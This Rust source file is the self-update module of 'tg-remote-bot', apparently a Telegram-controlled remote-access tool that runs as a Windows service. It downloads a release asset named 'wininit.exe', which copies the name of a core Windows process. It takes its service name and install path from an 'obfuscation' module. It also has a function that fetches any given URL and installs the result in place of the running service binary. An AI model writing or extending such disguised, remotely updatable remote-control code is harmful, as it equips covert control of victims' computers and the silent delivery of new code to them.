use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use windows_service::service::{ServiceAccess, ServiceState};
use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

use crate::security::obfuscation;

const GITHUB_API: &str = "https://api.github.com/repos/cecon123/tg-remote-bot/releases/latest";

const GITHUB_ASSET: &str = "wininit.exe";

pub async fn check_remote_version() -> Result<Option<String>> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .build()?;

    let resp = client
        .get(GITHUB_API)
        .header("User-Agent", "tg-remote-bot")
        .header("Accept", "application/vnd.github+json")
        .send()
        .await
        .context("cannot reach GitHub API")?;

    if resp.status() == reqwest::StatusCode::NOT_FOUND {
        return Ok(None);
    }

    let resp = resp.error_for_status().context("GitHub API error")?;
    let text = resp.text().await.context("cannot read GitHub response")?;
    let body: serde_json::Value =
        serde_json::from_str(&text).context("invalid JSON from GitHub")?;

    let tag = body["tag_name"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("no tag_name in release"))?;

    let remote_ver = tag.strip_prefix('v').unwrap_or(tag);
    let local_ver = env!("CARGO_PKG_VERSION");

    if remote_ver == local_ver {
        return Ok(None);
    }

    Ok(Some(remote_ver.to_string()))
}

pub async fn find_asset_url() -> Result<String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .build()?;

    let resp = client
        .get(GITHUB_API)
        .header("User-Agent", "tg-remote-bot")
        .header("Accept", "application/vnd.github+json")
        .send()
        .await
        .context("cannot reach GitHub API")?;

    let resp = resp.error_for_status().context("GitHub API error")?;
    let text = resp.text().await.context("cannot read GitHub response")?;
    let body: serde_json::Value =
        serde_json::from_str(&text).context("invalid JSON from GitHub")?;

    let assets = body["assets"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("no assets in release"))?;

    for asset in assets {
        if asset["name"].as_str() == Some(GITHUB_ASSET) {
            let url = asset["browser_download_url"]
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("no download url"))?;
            return Ok(url.to_string());
        }
    }

    anyhow::bail!("asset '{}' not found in release", GITHUB_ASSET);
}

async fn download_file(url: &str, dest: &Path) -> Result<()> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(300))
        .build()?;

    let resp = client
        .get(url)
        .header("User-Agent", "tg-remote-bot")
        .send()
        .await
        .context("download failed")?;

    let resp = resp.error_for_status().context("download HTTP error")?;
    let bytes = resp.bytes().await.context("cannot read download body")?;

    tokio::fs::write(dest, &bytes)
        .await
        .with_context(|| format!("cannot write to {}", dest.display()))?;

    Ok(())
}

fn stop_service() -> Result<()> {
    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
        .context("cannot open SCM")?;

    let service = manager
        .open_service(
            obfuscation::service_name(),
            ServiceAccess::STOP | ServiceAccess::QUERY_STATUS,
        )
        .context("cannot open service")?;

    let _ = service.stop();

    for _ in 0..30 {
        std::thread::sleep(Duration::from_secs(1));
        let status = service.query_status()?;
        if status.current_state == ServiceState::Stopped {
            return Ok(());
        }
    }

    anyhow::bail!("service did not stop within 30s");
}

fn start_service() -> Result<()> {
    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
        .context("cannot open SCM")?;

    let service = manager
        .open_service(obfuscation::service_name(), ServiceAccess::START)
        .context("cannot open service")?;

    service.start::<&str>(&[]).context("cannot start service")?;
    Ok(())
}

pub async fn apply_update(downloaded: &Path) -> Result<()> {
    let current_exe = std::env::current_exe().context("cannot get current exe path")?;
    let old_path = current_exe.with_extension("old");

    stop_service().context("failed to stop service")?;

    if current_exe.exists() {
        std::fs::rename(&current_exe, &old_path).context("cannot rename current exe to .old")?;
    }

    std::fs::copy(downloaded, &current_exe).context("cannot copy new binary into place")?;
    let _ = std::fs::remove_file(downloaded);

    start_service().context("failed to start service")?;

    std::process::exit(0);
}

pub async fn auto_update() -> Result<bool> {
    let remote_ver = match check_remote_version().await {
        Ok(Some(v)) => v,
        Ok(None) => {
            log::info!("version is up to date ({})", env!("CARGO_PKG_VERSION"));
            return Ok(false);
        }
        Err(e) => {
            log::warn!("version check failed: {e:?}");
            return Ok(false);
        }
    };

    log::info!(
        "new version available: {} -> {}",
        env!("CARGO_PKG_VERSION"),
        remote_ver
    );

    let url = find_asset_url().await?;
    let home = obfuscation::install_home();
    let tmp_path = home.join("_update_tmp.exe");

    download_file(&url, &tmp_path).await?;
    apply_update(&tmp_path).await?;

    Ok(true)
}

pub async fn self_update(url: &str) -> Result<()> {
    let home = obfuscation::install_home();
    let tmp_path = home.join("_update_tmp.exe");

    download_file(url, &tmp_path).await?;
    apply_update(&tmp_path).await?;

    Ok(())
}
